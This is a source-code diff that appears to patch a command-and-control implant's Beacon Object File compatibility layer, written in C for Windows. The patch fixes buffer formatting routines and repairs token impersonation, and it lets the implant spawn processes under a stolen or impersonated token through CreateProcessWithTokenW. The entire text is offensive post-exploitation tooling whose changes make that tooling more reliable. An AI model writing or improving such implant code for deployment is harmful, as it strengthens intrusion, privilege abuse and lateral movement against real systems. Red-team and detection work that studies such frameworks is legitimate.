@@ -345,7 +345,7 @@ VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
     if ( format == NULL )
         return;
 
-    format->original = Instance->Win32.LocalAlloc(maxsz, 1);
+    format->original = Instance->Win32.LocalAlloc( LPTR, maxsz );
     format->buffer = format->original;
     format->length = 0;
     format->size = maxsz;
@@ -355,7 +355,7 @@ VOID BeaconFormatReset( PFORMAT format )
 {
     MemSet( format->original, 0, format->size );
     format->buffer = format->original;
-    format->length = format->size;
+    format->length = 0;
 }
 
 VOID BeaconFormatFree( PFORMAT format )
@@ -376,6 +376,9 @@ VOID BeaconFormatFree( PFORMAT format )
 
 VOID BeaconFormatAppend( PFORMAT format, char* text, int len )
 {
+    if ( format->length + len > format->size )
+        return;
+
     MemCopy( format->buffer, text, len );
     format->buffer += len;
     format->length += len;
@@ -426,11 +429,13 @@ BOOL BeaconUseToken( HANDLE token )
 {
     HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
 
-    if ( ! SysNtDuplicateToken( token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken ) ) {
+    /* SetThreadToken requires an impersonation token */
+    if ( ! SysNtDuplicateToken( token, 0, NULL, FALSE, TokenImpersonation, &hImpersonateToken ) ) {
         return FALSE;
     }
 
     if ( ! Instance->Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
+        SysNtClose( hImpersonateToken );
         return FALSE;
     }
 
@@ -478,6 +483,18 @@ BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo
     }
     else
     {
+        /* grab the token we are currently impersonating (or our own process token)
+         * otherwise CreateProcessWithTokenW can never succeed */
+        if ( Instance->Tokens.Impersonate && Instance->Tokens.Token ) {
+            hToken = Instance->Tokens.Token->Handle;
+        } else {
+            hToken = TokenCurrentHandle();
+        }
+
+        if ( ! hToken ) {
+            return FALSE;
+        }
+
         bSuccess = Instance->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
     }
 
